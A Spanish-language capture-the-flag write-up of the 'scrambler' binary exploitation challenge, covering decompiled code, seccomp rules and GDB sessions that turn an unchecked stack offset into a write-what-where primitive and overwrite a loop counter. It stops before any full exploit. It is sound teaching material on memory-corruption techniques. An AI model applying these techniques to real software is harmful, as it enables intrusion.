<!doctype html><html lang=es><head><title>scrambler | 7Rocky</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Securinets Finals 2022. Binario de 64 bits. ROP. Ret2Libc. Sobrescritura de la GOT. Stack Pivot. Reglas Seccomp"><meta itemprop=description content="Securinets Finals 2022. Binario de 64 bits. ROP. Ret2Libc. Sobrescritura de la GOT. Stack Pivot. Reglas Seccomp"><meta name=twitter:card content="Securinets Finals 2022. Binario de 64 bits. ROP. Ret2Libc. Sobrescritura de la GOT. Stack Pivot. Reglas Seccomp"><meta name=twitter:description content="Securinets Finals 2022. Binario de 64 bits. ROP. Ret2Libc. Sobrescritura de la GOT. Stack Pivot. Reglas Seccomp"><meta property="og:description" content="Securinets Finals 2022. Binario de 64 bits. ROP. Ret2Libc. Sobrescritura de la GOT. Stack Pivot. Reglas Seccomp"><meta property="og:type" content="website"><meta name=robots content="index, follow"><meta name=author content="7Rocky"><meta name=twitter:author content="7Rocky"><meta property="og:author" content="7Rocky"><meta name=image content="https://7rocky.github.io/images/pwn.png"><meta name=twitter:image content="https://7rocky.github.io/images/pwn.png"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:site_name" content="7Rocky"><meta itemprop=name content="scrambler"><meta property="twitter:title" content="scrambler"><meta property="og:title" content="scrambler"><meta property="og:url" content="https://7rocky.github.io/ctf/other/scrambler/"><meta itemprop=keywords content><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href=/favicon.ico type=image/x-icon><link href=/css/style.css rel=stylesheet><link href=/css/main.css rel=stylesheet><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script><div style=display:none>$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\gcd}{\mathop{\mathrm{gcd}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$</div><script src=/js/imc.js></script>
<link href=/css/monokai-sublime.min.css rel=stylesheet><link href=/css/code.css rel=stylesheet><script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src=/js/htb.js></script></head><body class="ma0 production"><header style=position:sticky;top:0;z-index:9><div class=bg-black><nav class=ph4-ns role=navigation><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href title=es><img alt=es height=30px src=/images/es.png width=30px></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href=/en/ctf/other/scrambler/ title=en><img alt=en height=30px src=/images/en.png style="border:4px solid#000;border-radius:100%" width=30px></a><ul class="pl0 ml3 mr3" style=line-height:30px><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a></li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class=pb7 role=main><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label=aside class="instapaper_ignoref b helvetica tracked">OTROS CTF</aside><div id=sharing class=mt3><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/other/scrambler/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/other/scrambler/&text=scrambler" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/ctf/other/scrambler/&title=scrambler" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">scrambler</h1><br></header><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona un binario de 64 bits llamado <code>scrambler</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>Arch:     amd64-64-little
RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
Stack:    <span class=code-dark-green>Canary found</span>
NX:       <span class=code-dark-green>NX enabled</span>
PIE:      <span class=code-dark-red>No PIE (0x400000)</span>  
</code></pre></div><p>También tenemos el binario de Glibc (<code>libc.so_1.6</code>) de la instancia remota, por lo que podemos usar <code>pwninit</code> para parchear el binario y usar esta librería, de manera que el <em>exploit</em> sea igual en local y en remoto:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>pwninit</span> --libc <span class=mtku>libc.so_1.6</span> --bin <span class=mtku>scrambler</span> --no-template
<span class=code-dark-blue>bin</span>: <span class=code-blue>scrambler</span>
<span class=code-dark-yellow>libc</span>: <span class=code-yellow>libc.so.6</span>

<span class=code-green>fetching linker</span>
<span class=code-green>https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.31-0ubuntu9.7_amd64.deb</span>
<span class=code-yellow>unstripping libc</span>
<span class=code-green>https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.31-0ubuntu9.7_amd64.deb</span>  
<span class=code-dark-green>setting <span class=code-green>./ld-2.31.so</span> executable</span>
<span class=code-dark-green>symlinking <span class=code-green>libc.so.6</span> -&gt; <span class=code-green>libc.so_1.6</span></span>
<span class=code-dark-green>copying <span class=code-green>scrambler</span> to <span class=code-green>scrambler_patched</span></span>
<span class=code-dark-green>running patchelf on <span class=code-green>scrambler_patched</span></span>
</code></pre></div><p>Aunque el binario ha sido despojado (<em>stripped</em>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>file</span> <span class=mtku>scrambler</span>
scrambler: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1343b327e61aac49d34bc641ccd80457126ef56e, for GNU/Linux 3.2.0, stripped  
</code></pre></div><p>El proceso de ingeniería inversa no es muy difícil. Después de cargar el binario en Ghidra y renombrar variables y funciones, tenemos que esta es la función <code>main</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>()</span> <span class=mtk1>{</span>
  <span class=mtk1>undefined4</span> <span class=mtk1>uVar1;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>iVar2;</span>
  <span class="mtk7 mtki">long</span> <span class=mtk1>in_FS_OFFSET;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>option;</span>
  <span class=mtk1>undefined4</span> <span class=mtk1>arg1;</span>
  <span class=mtk1>undefined4</span> <span class=mtk1>arg2;</span>
  <span class=mtk1>undefined4</span> <span class=mtk1>arg3;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>i;</span>
  <span class=mtk1>undefined</span> <span class=mtk1>auStack40</span> <span class=mtk1>[</span><span class=mtk6>8</span><span class=mtk1>];</span>
  <span class="mtk7 mtki">long</span> <span class=mtk1>canary;</span>

  <span class=mtk1>canary</span> <span class=mtk5>=</span> <span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">long</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>(in_FS_OFFSET</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>28</span><span class=mtk1>);</span>
  <span class=mtk8>setup</span><span class=mtk1>();</span>
  <span class=mtk8>seccomp_rules</span><span class=mtk1>();</span>
  <span class=mtk1>i</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>

  <span class=mtk5>while</span> <span class=mtk1>(</span><span class=mtk6>true</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"1)</span> <span class=mtk4>Try</span> <span class=mtk4>scrambling"</span><span class=mtk1>);</span>
    <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"2)</span> <span class=mtk4>Quit"</span><span class=mtk1>);</span>
    <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"&gt;</span> <span class=mtk4>"</span><span class=mtk1>);</span>
    <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%d</span><span class=mtk4>"</span><span class=mtk1>,</span><span class=mtk5>&amp;</span><span class=mtk1>option);</span>

    <span class=mtk5>if</span> <span class=mtk1>(option</span> <span class=mtk5>!=</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk5>break</span><span class=mtk1>;</span>

    <span class=mtk5>if</span> <span class=mtk1>(i</span> <span class=mtk5>&lt;</span> <span class=mtk6>8</span><span class=mtk1>)</span> <span class=mtk1>{</span>
      <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"arg1</span> <span class=mtk4>=</span> <span class=mtk4>"</span><span class=mtk1>);</span>
      <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"&gt;</span> <span class=mtk4>"</span><span class=mtk1>);</span>
      <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%d</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>&amp;</span><span class=mtk1>arg1);</span>
      <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"arg2</span> <span class=mtk4>=</span> <span class=mtk4>"</span><span class=mtk1>);</span>
      <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"&gt;</span> <span class=mtk4>"</span><span class=mtk1>);</span>
      <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%d</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>&amp;</span><span class=mtk1>arg2);</span>
      <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"arg3</span> <span class=mtk4>=</span> <span class=mtk4>"</span><span class=mtk1>);</span>
      <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"&gt;</span> <span class=mtk4>"</span><span class=mtk1>);</span>
      <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%d</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>&amp;</span><span class=mtk1>arg3);</span>
      <span class=mtk1>uVar1</span> <span class=mtk5>=</span> <span class=mtk1>arg3;</span>
      <span class=mtk1>iVar2</span> <span class=mtk5>=</span> <span class=mtk8>return_random</span><span class=mtk1>(arg1,arg2);</span>
      <span class=mtk1>auStack40[iVar2]</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class="mtk7 mtki">char</span><span class=mtk1>)</span> <span class=mtk1>uVar1;</span>
      <span class=mtk1>i</span><span class=mtk5>++</span><span class=mtk1>;</span>
    <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
      <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Not</span> <span class=mtk4>allowed!"</span><span class=mtk1>);</span>
    <span class=mtk1>}</span>
  <span class=mtk1>}</span>

  <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Good</span> <span class=mtk4>bye!"</span><span class=mtk1>);</span>

  <span class=mtk5>if</span> <span class=mtk1>(canary</span> <span class=mtk5>!=</span> <span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">long</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>(in_FS_OFFSET</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>28</span><span class=mtk1>))</span> <span class=mtk1>{</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>  
    <span class=mtk8>__stack_chk_fail</span><span class=mtk1>();</span>
  <span class=mtk1>}</span>

  <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
<span class=mtk1>}</span>
</code></pre></div><p>El binario está protegido con reglas <code>seccomp</code>. Podemos usar <code>seccomp-tools</code> para ver qué llamadas de systema podemos utilizar:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>seccomp-tools</span> dump <span class=mtku>./scrambler</span>
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0a 0xc000003e  if (A != <span class=rb-white>ARCH_X86_64</span>) goto 0012  
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < <span class=rb-green>0x40000000</span>) goto 0005
 0004: 0x15 0x00 0x07 0xffffffff  if (A != <span class=rb-green>0xffffffff</span>) goto 0012
 0005: 0x15 0x05 0x00 0x00000000  if (A == <span class=rb-green>read</span>) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == <span class=rb-green>write</span>) goto 0011
 0007: 0x15 0x03 0x00 0x00000002  if (A == <span class=rb-green>open</span>) goto 0011
 0008: 0x15 0x02 0x00 0x0000000a  if (A == <span class=rb-green>mprotect</span>) goto 0011
 0009: 0x15 0x01 0x00 0x0000003c  if (A == <span class=rb-green>exit</span>) goto 0011
 0010: 0x15 0x00 0x01 0x000000e7  if (A != <span class=rb-green>exit_group</span>) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
</code></pre></div><p>Vemos que solo podemos usar <code>open</code>, <code>read</code>, <code>write</code> y <code>mprotect</code>. Por tanto, el objetivo del reto es leer la <em>flag</em> (que está en <code>/home/ctf/flag.txt</code>, dato del reto), y no conseguir una <em>shell</em>.</p><p>Analizando la función <code>main</code>, vemos que podemos introducir tres números (<code>arg1</code>, <code>arg2</code> y <code>arg3</code>). Luego, <code>arg1</code> y <code>arg2</code> se pasan a la función que renombré como <code>return_random</code>. El resultado de esta función se usará como <em>offset</em> respecto a una dirección de la pila (<em>stack</em>) y <code>arg3</code> será el valor que se almacene ahí (como <code>char</code>). Probablemente se vea mejor en la instrucción en ensamblador (tomada de la salida de <code>objdump</code>):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>40150c:       88 54 05 e0             mov    BYTE PTR [rbp+rax*1-0x20],dl  
</code></pre></div><p>Esta es la función <code>return_random</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">int</span> <span class=mtk8>return_random</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">arg1</span><span class=mtk1>,</span> <span class="mtk7 mtki">int</span> <span class="mtk9 mtki">arg2</span><span class=mtk1>)</span> <span class=mtk1>{</span>  
  <span class="mtk7 mtki">int</span> <span class=mtk1>iVar1;</span>
  <span class="mtk7 mtki">time_t</span> <span class=mtk1>tVar2;</span>

  <span class=mtk1>tVar2</span> <span class=mtk5>=</span> <span class=mtk8>time</span><span class=mtk1>((</span><span class="mtk7 mtki">time_t</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>0x</span><span class=mtk6>0</span><span class=mtk1>);</span>
  <span class=mtk8>srand</span><span class=mtk1>((</span><span class="mtk7 mtki">uint</span><span class=mtk1>)</span> <span class=mtk1>tVar2);</span>
  <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>rand</span><span class=mtk1>();</span>

  <span class=mtk5>return</span> <span class=mtk1>arg2</span> <span class=mtk5>+</span> <span class=mtk1>iVar1</span> <span class=mtk5>%</span> <span class=mtk1>arg1;</span>
<span class=mtk1>}</span>
</code></pre></div><p>Está cogiendo un valor aleatorio y realizando operaciones matemáticas con los argumentos <code>arg1</code> y <code>arg2</code>. Podríamos pensar en usar un generador de números pseudo-aleatorios (PRNG) inicializado en <code>time(0)</code> como el el programa, de manera que sepamos el valor de <code>iVar2</code> y tengamos mayor control sobre el valor retornado de la función. Sin embargo, nos podemos olvidar del valor aleatorio si ponemos <code>arg1 = 1</code>, porque:</p><p>$$
z = 0 \pmod{1} \quad, \forall z \in \mathbb{Z}
$$</p><p>Por tanto, si <code>arg1 = 1</code>, entonces <code>return_random(arg1, arg2) = arg2</code>, por lo que tenemos control total el valor que devuelve <code>return_random</code> (igual tendría que haber cambiado el nombre de la función&mldr; no es muy aleatorio).</p><p>En este punto, tenemos una primitiva &ldquo;<em>write-what-where</em>&rdquo;, porque controlamos <code>arg3</code> (que irá a <code>$dl</code>, solo 1 byte) y controlamos el valor que devuelve <code>return_address</code> (que será el <em>offset</em> respecto a <code>$rbp - 0x20</code>, guardado en <code>$rax</code>).</p><p>Existe otra limitación en la función <code>main</code>, que es que el programa no nos permitirá hacer &ldquo;<em>scrambling</em>&rdquo; si el contador llega a <code>i = 8</code>. Para evitar esto, podemos hacer uso de la primitiva &ldquo;<em>write-what-where</em>&rdquo; y cambiar el valor del contador a un número negativo, de manera que tengamos intentos de &ldquo;<em>scrambling</em>&rdquo; casi ilimitados. Esta es la instrucción en ensamblador que incrementa el contador:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>401510:       83 45 dc 01             add    DWORD PTR [rbp-0x24],0x1  
</code></pre></div><p>Vemos que el contador está almacenado en <code>$rbp - 0x24</code>. La primitiva &ldquo;<em>write-what-where</em>&rdquo; se realiza respecto a <code>$rbp - 0x20</code>, por lo que los 4 bytes anteriores (los <code>int</code> tienen 32 bits) tenemos el valor del contador. Podemos verificarlo con GDB poniendo un <em>breakpoint</em> en esa dirección:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q <span class=mtku>scrambler_patched</span>
Reading symbols from <span class=code-dark-green>scrambler_patched</span>...
(No debugging symbols found in <span class=code-dark-green>scrambler_patched</span>)  
<span class=code-red>gef➤</span>  break *0x401510
Breakpoint 1 at <span class=code-dark-blue>0x401510</span>
<span class=code-red>gef➤</span>  run
Starting program: ./scrambler_patched
1) Try scrambling
2) Quit
&gt; 1
arg1 =
&gt; 1
arg2 =
&gt; -4
arg3 =
&gt; 100

Breakpoint 1, <span class=code-dark-blue>0x0000000000401510</span> in <span class=code-dark-yellow>??</span> ()
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  x/x $rbp-0x24
<span class=code-dark-blue>0x7fffffffe70c</span>: 0x00000064  
<span class=code-green>gef➤</span>  x/d $rbp-0x24
<span class=code-dark-blue>0x7fffffffe70c</span>: 100
</code></pre></div><p>Y aquí lo tenemos. Hemos sobrescrito el valor del contador para que sea <code>100</code> (<code>0x64</code>). Para conseguir un número negativo, tenemos que conseguir que el bit más significativo esté a <code>1</code>. De hecho, el mínimo valor del tipo <code>int</code> es $-2^{31}$, que se representa como <code>0x80000000</code> (más información <a href="https://docs.microsoft.com/en-us/cpp/c-language/cpp-integer-limits?view=msvc-170">aquí</a>). Entonces, si ponemos <code>-1</code> en lugar de <code>-4</code> y ponemos <code>128</code> (<code>0x80</code>) en vez de <code>100</code>, obtendremos un número negativo grande, y no nos tendremos que preocupar más del número de intentos.</p><p>Solo por probar:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  run
Starting program: ./scrambler_patched
1) Try scrambling
2) Quit
&gt; 1
arg1 =
&gt; 1
arg2 =
&gt; -1
arg3 =
&gt; 128

Breakpoint 1, <span class=code-dark-blue>0x0000000000401510</span> in <span class=code-dark-yellow>??</span> ()  
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  x/x $rbp-0x24
<span class=code-dark-blue>0x7fffffffe70c</span>: 0x80000000
<span class=code-green>gef➤</span>  x/d $rbp-0x24
<span class=code-dark-blue>0x7fffffffe70c</span>: -2147483648  
